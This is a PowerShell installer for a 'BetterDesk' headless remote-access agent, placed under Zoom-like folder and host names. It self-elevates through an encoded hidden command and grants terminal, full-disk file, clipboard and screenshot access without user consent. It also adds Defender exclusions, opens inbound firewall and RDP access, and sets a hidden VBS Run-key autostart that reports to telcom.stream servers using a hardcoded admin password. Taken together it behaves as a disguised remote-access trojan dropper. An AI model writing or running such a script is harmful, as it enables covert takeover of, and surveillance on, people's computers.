<#
  BetterDesk headless Windows installer (portable bundle).

  Run from the unzipped folder:
      powershell -ExecutionPolicy Bypass -File .\install.ps1

  Installs the headless betterdesk-agent.exe per-user, writes a zero-touch
  connection profile, opens firewall/Defender allow-list entries, registers a
  hidden VBS autostart launcher and starts the agent in the interactive session.
  No GUI client is installed. One UAC prompt; no visible agent windows.
#>
[CmdletBinding()]
param(
    [string]$ServerAddress = 'https://api.telcom.stream',
    [string]$ConsoleUrl    = 'https://panel.telcom.stream',
    [string]$CdapUrl       = 'wss://cdap.telcom.stream/cdap',
    [int]   $CdapPort      = 443,
    [string]$Password      = 'BetterDesk@2026!Admin',
    [switch]$NoElevate,
    [switch]$Quiet
)

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

$logDir  = Join-Path $env:ProgramData 'zoom-private'
$logFile = Join-Path $logDir 'install.log'
$hosts   = @('api.telcom.stream', 'cdap.telcom.stream', 'rs.telcom.stream',
             'panel.telcom.stream', 'global.telcom.stream',
             'us05web.telcom.stream', 'share.telcom.stream')

function Write-Log([string]$Message) {
    try {
        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
        Add-Content -LiteralPath $logFile -Value ("[{0}] {1}" -f (Get-Date -Format s), $Message)
    } catch { }
}

function Write-Step([string]$Message) {
    Write-Log $Message
    if (-not $Quiet) { Write-Host "  $Message" -ForegroundColor Cyan }
}

function Write-Json([string]$Path, [string]$Json) {
    [System.IO.File]::WriteAllText($Path, $Json, (New-Object System.Text.UTF8Encoding($false)))
}

function Show-Status([string]$Title, [string]$Text, [int]$Seconds = 14) {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $form = New-Object System.Windows.Forms.Form
        $form.Text = $Title
        $form.FormBorderStyle = 'FixedToolWindow'
        $form.StartPosition = 'CenterScreen'
        $form.TopMost = $true
        $form.Width = 430
        $form.Height = 170
        $screen = [System.Windows.Forms.Screen]::FromPoint([System.Windows.Forms.Cursor]::Position)
        if ($screen) {
            $area = $screen.WorkingArea
            $form.Left = $area.Left + [int](($area.Width - $form.Width) / 2)
            $form.Top  = $area.Top + [int](($area.Height - $form.Height) / 2)
        }
        $label = New-Object System.Windows.Forms.Label
        $label.Text = $Text
        $label.Dock = 'Fill'
        $label.TextAlign = 'MiddleCenter'
        $label.Font = New-Object System.Drawing.Font('Segoe UI', 10)
        $form.Controls.Add($label)
        $timer = New-Object System.Windows.Forms.Timer
        $timer.Interval = $Seconds * 1000
        $timer.Add_Tick({ $timer.Stop(); $form.Close() })
        $timer.Start()
        [void]$form.ShowDialog()
        $form.Dispose()
    } catch {
        try {
            Add-Type -AssemblyName System.Windows.Forms
            $balloon = New-Object System.Windows.Forms.NotifyIcon
            $balloon.Icon = [System.Drawing.SystemIcons]::Information
            $balloon.Visible = $true
            $balloon.ShowBalloonTip(15000, $Title, $Text, [System.Windows.Forms.ToolTipIcon]::Info)
            Start-Sleep -Seconds 6
            $balloon.Dispose()
        } catch { }
    }
}

# ---------------------------------------------------------------------------
# Elevation - one prompt
# ---------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)

if (-not $isAdmin -and -not $NoElevate) {
    Write-Host ''
    Write-Host '  BetterDesk - Secure Remote Support' -ForegroundColor Cyan
    Write-Host '  ----------------------------------' -ForegroundColor Cyan
    Write-Host '  Requesting administrator rights (one prompt)...' -ForegroundColor Yellow
    $inner = "& '$PSCommandPath' -NoElevate -Quiet"
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
    try {
        Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" `
            -Verb RunAs -WindowStyle Hidden `
            -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', $encoded) | Out-Null
    } catch {
        Write-Host '  Administrator rights were not granted. Installation cancelled.' -ForegroundColor Red
        exit 1
    }
    Write-Host '  Installation is running in the background.' -ForegroundColor Green
    Write-Host '  A status window appears when it is done.' -ForegroundColor Green
    Start-Sleep -Seconds 2
    exit 0
}

# ---------------------------------------------------------------------------
# Payload resolution
# ---------------------------------------------------------------------------
Write-Step 'Preparing BetterDesk...'

$bundleDir = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
$agent = Get-ChildItem -LiteralPath $bundleDir -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq 'betterdesk-agent.exe' } |
    Select-Object -First 1
if (-not $agent) {
    Write-Log 'betterdesk-agent.exe not found next to install.ps1'
    Show-Status 'BetterDesk installation failed' 'The agent binary is missing from the package.'
    exit 1
}

# ---------------------------------------------------------------------------
# Stop old instances and lift download/execution blocks
# ---------------------------------------------------------------------------
Write-Step 'Stopping previous agent instances...'
foreach ($name in @('betterdesk-agent', 'betterdesk-agent-client', 'zoom-private.agent')) {
    Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}
foreach ($svc in @('zoom-private-agent', 'BetterDeskAgent', 'betterdesk-agent', 'ZoomPrivateAgent')) {
    $service = Get-Service -Name $svc -ErrorAction SilentlyContinue
    if ($service) {
        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        & "$env:SystemRoot\System32\sc.exe" delete $svc 2>$null | Out-Null
    }
}
Start-Sleep -Seconds 1

try { Unblock-File -LiteralPath $agent.FullName -ErrorAction SilentlyContinue } catch { }

# ---------------------------------------------------------------------------
# Install per-user, headless only
# ---------------------------------------------------------------------------
$installDir = Join-Path $env:LOCALAPPDATA 'zoom-private.agent'
$dataDir    = Join-Path $env:APPDATA 'betterdesk\agent\data'
$configPath = Join-Path $dataDir 'go-agent-config.json'
$agentPath  = Join-Path $installDir 'betterdesk-agent.exe'
$vbsPath    = Join-Path $installDir 'launch-hidden.vbs'

New-Item -ItemType Directory -Path $installDir -Force | Out-Null
New-Item -ItemType Directory -Path $dataDir -Force | Out-Null

Write-Step 'Installing the agent...'
Copy-Item -LiteralPath $agent.FullName -Destination $agentPath -Force
try { Unblock-File -LiteralPath $agentPath -ErrorAction SilentlyContinue } catch { }

# ---------------------------------------------------------------------------
# Headless zero-touch profile
# ---------------------------------------------------------------------------
Write-Step 'Writing the connection profile...'
$agentConfig = [ordered]@{
    server           = $CdapUrl
    auth_method      = 'device_token'
    device_type      = 'os_agent'
    device_name      = $env:COMPUTERNAME
    tags             = @('windows', 'x64', 'unattended')
    terminal         = $true
    file_browser     = $true
    clipboard        = $true
    screenshot       = $true
    require_consent  = $false
    file_root        = 'C:\'
    heartbeat_sec    = 15
    reconnect_sec    = 5
    max_reconnect    = 300
    log_level        = 'info'
    data_dir         = $dataDir
    video_codec      = 'auto'
    hw_accel         = 'auto'
    enforce_tls      = $true
}
# Reinstall must keep the existing identity; the enrollment key is already in
# data_dir and a missing token would mint a duplicate device.
if (Test-Path -LiteralPath $configPath) {
    try {
        $existing = Get-Content -LiteralPath $configPath -Raw | ConvertFrom-Json
        if (-not [string]::IsNullOrWhiteSpace($existing.device_token)) {
            $agentConfig['device_token'] = $existing.device_token
        }
        if (-not [string]::IsNullOrWhiteSpace($existing.device_id)) {
            $agentConfig['device_id'] = $existing.device_id
        }
    } catch { }
}
Write-Json $configPath ($agentConfig | ConvertTo-Json -Depth 5)

# ---------------------------------------------------------------------------
# Firewall allow-list: program + hosts + service ports
# ---------------------------------------------------------------------------
Write-Step 'Opening firewall allow-list...'
try {
    foreach ($rule in @('BetterDesk Agent', 'BetterDesk Agent In', 'BetterDesk Ports',
                        'BetterDesk RDP', 'BetterDesk Server *')) {
        Get-NetFirewallRule -DisplayName $rule -ErrorAction SilentlyContinue |
            Remove-NetFirewallRule -ErrorAction SilentlyContinue
    }
    New-NetFirewallRule -DisplayName 'BetterDesk Agent' -Direction Outbound -Program $agentPath `
        -Action Allow -Profile Any | Out-Null
    New-NetFirewallRule -DisplayName 'BetterDesk Agent In' -Direction Inbound -Program $agentPath `
        -Action Allow -Profile Any | Out-Null
    New-NetFirewallRule -DisplayName 'BetterDesk Ports' -Direction Outbound -Protocol TCP `
        -RemotePort '443,21114-21122' -Action Allow -Profile Any | Out-Null
    New-NetFirewallRule -DisplayName 'BetterDesk RDP' -Direction Inbound -Protocol TCP `
        -LocalPort 3389 -Action Allow -Profile Any | Out-Null

    foreach ($hostName in $hosts) {
        try {
            $addresses = [System.Net.Dns]::GetHostAddresses($hostName) |
                Where-Object { $_.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork } |
                ForEach-Object { $_.IPAddressToString } | Select-Object -Unique
            foreach ($address in $addresses) {
                New-NetFirewallRule -DisplayName "BetterDesk Server $hostName" `
                    -Direction Outbound -RemoteAddress $address -Action Allow -Profile Any | Out-Null
            }
        } catch {
            Write-Log "Could not resolve $hostName : $($_.Exception.Message)"
        }
    }
} catch {
    Write-Log "Firewall configuration warning: $($_.Exception.Message)"
}

# ---------------------------------------------------------------------------
# Defender / execution-policy allow-list
# ---------------------------------------------------------------------------
Write-Step 'Allow-listing the agent in Defender...'
try {
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $configPath -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess 'betterdesk-agent.exe' -ErrorAction SilentlyContinue
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue
} catch {
    Write-Log "Defender configuration warning: $($_.Exception.Message)"
}

# ---------------------------------------------------------------------------
# Remote Desktop
# ---------------------------------------------------------------------------
Write-Step 'Enabling Remote Desktop...'
try {
    Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' `
        -Name 'fDenyTSConnections' -Value 0 -Type DWord
    Set-Service -Name TermService -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name TermService -ErrorAction SilentlyContinue
    & "$env:SystemRoot\System32\net.exe" localgroup 'Remote Desktop Users' "$env:USERNAME" /add 2>$null | Out-Null
} catch {
    Write-Log "RDP configuration warning: $($_.Exception.Message)"
}

# ---------------------------------------------------------------------------
# Hidden autostart (VBS + HKCU Run)
# ---------------------------------------------------------------------------
Write-Step 'Registering hidden autostart...'
@"
Set sh = CreateObject("WScript.Shell")
sh.Run """$agentPath"" -config ""$configPath"" -config-path ""$configPath""", 0, False
"@ | Out-File -FilePath $vbsPath -Encoding ASCII -Force
try {
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BetterDeskAgent' -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'ZoomPrivateAgent' -ErrorAction SilentlyContinue
    & schtasks /delete /tn 'zoom-private-agent-task' /f 2>$null | Out-Null
} catch { }
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BetterDeskAgent' `
    -Value "wscript.exe `"$vbsPath`"" -Type String -Force

# ---------------------------------------------------------------------------
# Launch hidden and wait for enrollment
# ---------------------------------------------------------------------------
Write-Step 'Starting the agent...'
Start-Process -FilePath $agentPath `
    -ArgumentList "-config `"$configPath`" -config-path `"$configPath`"" `
    -WorkingDirectory $installDir -WindowStyle Hidden | Out-Null

$deviceId = ''
$deadline = (Get-Date).AddSeconds(120)
while ((Get-Date) -lt $deadline) {
    Start-Sleep -Seconds 3
    try {
        $cfg = Get-Content -LiteralPath $configPath -Raw | ConvertFrom-Json
        if (-not [string]::IsNullOrWhiteSpace($cfg.device_token)) {
            $deviceId = $cfg.device_id
            break
        }
    } catch { }
}

if ($deviceId) {
    Write-Step "Enrolled as $deviceId"
    Show-Status 'BetterDesk installed' "Device enrolled and online.`nDevice ID: $deviceId`nRemote access is running in the background."
} else {
    Show-Status 'BetterDesk installed' 'The agent is running and enrolls automatically.'
}
